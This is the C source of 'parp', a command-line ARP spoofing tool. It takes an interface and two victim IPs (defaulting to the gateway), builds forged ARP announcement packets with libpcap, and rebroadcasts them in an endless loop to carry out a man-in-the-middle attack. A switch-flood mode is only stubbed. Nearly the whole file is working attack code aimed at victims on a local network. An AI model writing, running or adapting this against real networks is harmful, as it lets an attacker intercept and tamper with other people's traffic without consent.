#include<stdio.h>
#include<stdlib.h>
#include <time.h>
#include<netinet/in.h> // for addresses translation
#include<errno.h>
#include <signal.h> // for signal control handling in posix env
// for ntohs etc
// can also be necessary to include netinet/in
#include <arpa/inet.h>
#include <unistd.h> // options parsing

#include <pcap.h>
#include "packet_struct.h"
#include "pcap_routines.h"

#include "arp.h"
#include "network.h"


/*-----------------------------------------------------------------------------
 *  Prototypes ..
 *-----------------------------------------------------------------------------*/
void
mitm ( char * hostA,char * hostB );
void
mitm_loop (void);
void
mitm_check (char * hostA,char * hostB );
void sigint(void);
void usage(void);

/*-----------------------------------------------------------------------------
 *  packet count is deprecated now. Used by pcap to sniff a certain number
 *  of packets.
 *-----------------------------------------------------------------------------*/
unsigned int packet_count = 0;

/*-----------------------------------------------------------------------------
 *  Interface we will be using.
 *-----------------------------------------------------------------------------*/
char * interface = NULL;
/*-----------------------------------------------------------------------------
 *  Our OWN mac address & ip address
 *-----------------------------------------------------------------------------*/
struct ether_addr mac;
struct in_addr ip;

/*-----------------------------------------------------------------------------
 *  The Victim's IP address
 *  & the packets we will send. Needed to free memory at exit.
 *  Ugly i know, but working & fast.
 *-----------------------------------------------------------------------------*/
struct in_addr victim_a;
struct in_addr victim_b;
Packet * A = NULL;
Packet * B = NULL;

/*-----------------------------------------------------------------------------
 *  At which frequency should we send packets to flood (both mode).
 *  in milliseconds.
 *-----------------------------------------------------------------------------*/
unsigned int frequency = 1000;

/*-----------------------------------------------------------------------------
 *  How much time shoudl we wait before updating again the victim's arp table. in Seconds.
 *-----------------------------------------------------------------------------*/
unsigned int latency = 10;


/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  sigint
 *  Description:  controls the exit of the application
 * =====================================================================================
 */
    void
sigint ( void )
{
    pcap_exit_();
    if(A != NULL) free(A);
    if(B != NULL) free(B);
    printf("Exiting application...\n");
    exit(EXIT_SUCCESS);
}		/* -----  end of function sigint  ----- */

void usage(void) {
    printf("parp -m method -i interface [-a victimA] [-b victimB] [-f flood_frequency] [-l latency]\n");
    printf("\t-Method is either mitm or flood. If mitm, you have to specify at least the -a option. If b is not specified, it will use the default gateway on the network. If flood is chosen,it will only flood the CAM cache of the switch. \n");
    printf("\t-Interface is the interface you want to listen on. It will try to put it in monitor mode\n");
    printf("\tVictimA is the IP of the victim you want to abuse.\n");
    printf("\tVictimB is usually the router (default), but you can specify another ip address, to be in the middle of the traffic between A & B.\n");
    printf("\tFlood_frequency is the rate of which parp will send packets (either to the switch or to victims. Specified in milliseconds.\n");
    printf("\tLatency is for the mitm mode. parp must send continously packets in order to maitain the ARP table of the victim's. Usually, it is refreshed around 2mn, the default here is 30 sec. Specify in seconds.\n");
}


    int
main ( int argc, char *argv[] )
{
    char * operation = NULL;
    char * hostA = NULL;
    char * hostB = NULL;

    int c = 0;

    if (argc < 2) {
        usage();
        exit(EXIT_FAILURE);
    }

    while((c = getopt(argc,argv,"m:i:a:b:f:l:")) != -1){
        switch(c){
            case 'm':
                operation = optarg;
                if (strncmp(operation,"mitm",4) != 0 &&
                        strncmp(operation,"flood",5) != 0) {
                    fprintf(stderr,"Operation %s is unknown.Abort\n",operation);
                    abort();
                }
                break;
            case 'i':
                interface = optarg;
                break;
            case 'a':
                hostA = optarg;
                if (inet_aton(hostA,&victim_a) == 0) {
                    fprintf(stderr,"Invalid parsing of A's address");
                    exit(EXIT_FAILURE);
                }
                break;
            case 'b':
                hostB = optarg;
                if (inet_aton(hostB,&victim_b) == 0) {
                    fprintf(stderr,"Invalid parsing of B's address");
                    exit(EXIT_FAILURE);
                }
                break;
            case 'f':
                frequency = atoi(optarg);
                break;
            case 'l':
                latency = atoi(optarg);
                break;
            case '?':
                fprintf(stderr,"Option %c requires an argument",optopt);
                abort();
        }
    }

    /* Check options consistency */
    if(operation == NULL) { 
        fprintf(stderr,"No Operations given. Abort.\n");
        exit(EXIT_FAILURE);
    } else if (interface == NULL) {
        fprintf(stderr,"No interface given. Abort.\n");
        exit(EXIT_FAILURE);
    } 
    
    /* Store our own ip address */
    if(get_ip_address(interface,&ip) == -1) {
        fprintf(stderr,"Could not get IP address.Abort.\n");
        exit(EXIT_FAILURE);
    }
    
    /* Store our own mac address */
    if (get_mac_address(interface,&mac) == -1) {
        fprintf(stderr,"Abort.\n");
        exit(EXIT_FAILURE);
    }

    /* set up pcap */
    init_pcap(interface,"arp"); 


    /* Print arguments to stdout */
    printf("Arguments are :");
    printf("\n\tMethod : %s",operation);
    printf("\n\tInterface : %s",interface);
    if(latency != 0) printf("\n\tLatency : %d",latency);
    if(frequency != 0) printf("\n\tFrequency : %d",frequency);
    printf("\nInterface infos :");
    printf("\n\tMAC : %s",ether_ntoa(&mac));
    printf("\n\tIP : %s\n",inet_ntoa(ip)); 

    /* Call right method */
    if (strncmp(operation,"mitm",4) == 0) {
        mitm(hostA,hostB);
    } else if (strncmp(operation,"flood",5) == 0) {
        //flood();
        printf("No Switch Flood attack implemented yet.\n");
    }

    return EXIT_SUCCESS;
}				/* ----------  end of function main  ---------- */



/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  mitm
 *  Description:  Operate Man in the Middle attack
 * =====================================================================================
 */
    void
mitm ( char * hostA,char * hostB )
{
    MAC * broadcast = ETHER_ATON(BROADCAST_MAC);
    MAC * null = ETHER_ATON(NULL_MAC);
    /* check addresses etc */
    mitm_check(hostA,hostB);
    /* prepare packets for each dest */
    A = arp_packet(REQUEST);
    B = arp_packet(REPLY);
    /* Set ethernet frame -> broadcast .. :/ */
    arp_set_ethernet_frame(A,&mac,broadcast);
    arp_set_ethernet_frame(B,&mac,broadcast);
    /* Set Hardware Address fields */
    arp_set_hard_addr(A,&mac,null);
    arp_set_hard_addr(B,&mac,null);
    /* Set Protocol Address fields (IP) */
    /* Same address for both fields according to RFC 5227 
     * ARP Announcement */
    arp_set_proto_addr(A,&victim_a,&victim_a);
    arp_set_proto_addr(B,&victim_b,&victim_b);

    mitm_loop();

    return ;
}		/* -----  end of function mitm  ----- */


    void
mitm_loop (void)
{
    int sent = 0,suceed = 0;
    while(1) {
        if(pcap_send_packet(A,ARP_PACKET_SIZE) == 0) suceed++;
        if(pcap_send_packet(B,ARP_PACKET_SIZE) == 0) suceed++;
        sent += 2;
        printf("MitM Attack Packets sent : %d ( success : %4f )\n",
                sent,((double)(suceed)/(double)(sent)) * 100);         
        sleep(latency);
    }
    return ;
}		/* -----  end of function mitm_loop  ----- */
/* 
 * ===  FUNCTION  ======================================================================
 *         Name:  mitm_check
 *  Description:  Check if the addresses are good, replace if needed, 
 *  get our OWN MAC address etc..
 * =====================================================================================
 */
    void
mitm_check (char * hostA,char * hostB )
{
    char victimb[INET_ADDRSTRLEN];
    /* First check victim's ip */
    if(hostA == NULL) {
        fprintf(stderr,"No Victim specified for MitM attack. Abort.\n");
        exit(EXIT_FAILURE);
    }
    /* if no B victim, default on the gateway */
    if(hostB == NULL) {
        /* Get the default gateway */
        if(get_gatewayip(victimb) == -1) {
            fprintf(stderr,"Could not get gateway's ip address. Abort.\n");
            exit(EXIT_FAILURE);
        }   
        /* Transform it in the right struct in_addr */
        if(inet_aton(victimb,&victim_b) == 0) {
            fprintf(stderr,"Could not parse correctly the gateway's ip address. Abort.\n");
            exit(EXIT_FAILURE);
        }
    }
    printf("Man In The Middle Attack :");
    printf("\n\tHost A : %s",inet_ntoa(victim_a));
    printf("\n\tHost B : %s",inet_ntoa(victim_b));
    if(hostB == NULL) printf(" (default gateway)");

    return ;
}		/* -----  end of function mitm_check  ----- */


/*-----------------------------------------------------------------------------
 *  old main. Just kept because it shows how to prepare sniffing with pcap
 *  routines.
 *-----------------------------------------------------------------------------*/
//int main(int argc, char * argv[])
//{
//    int i = 0; // counter
//    int ret;
//    char * default_filter = "arp";
//    char * filter;
//    int pcount = -1; //take all packet by defaults
//    char * interface;
//    if(argc < 4) {
//        fprintf(stderr, "Not enough arguments\n");
//        usage();
//        exit(EXIT_FAILURE);
//    }
//    // take command line filter
//    if(argc > 3) {
//        filter = argv[4];
//    } else {
//        filter = default_filter;
//    }
//    // take command line packet count limit
//    if(argc > 4) {
//        pcount = atoi(argv[4]);
//    }
//    interface = argv[1];
//    if(inet_aton(argv[2],&victimip) == 0) {
//        fprintf(stderr,"Invalid parsing of the victim ip address\n");
//        exit(EXIT_FAILURE);
//    }
//    if(inet_aton(argv[3],&routerip) == 0) {
//        fprintf(stderr,"Invalid parsing of the router ip address\n");
//        exit(EXIT_FAILURE);
//    }
//
//    get_mac_addr(interface,mac);
//    
//    printf("Arguments : interface %s (",interface);
//    print_mac_addr(mac);
//    printf(", ip router %s\n",inet_ntoa(routerip));
//
//    signal(SIGINT,sigint);
//}
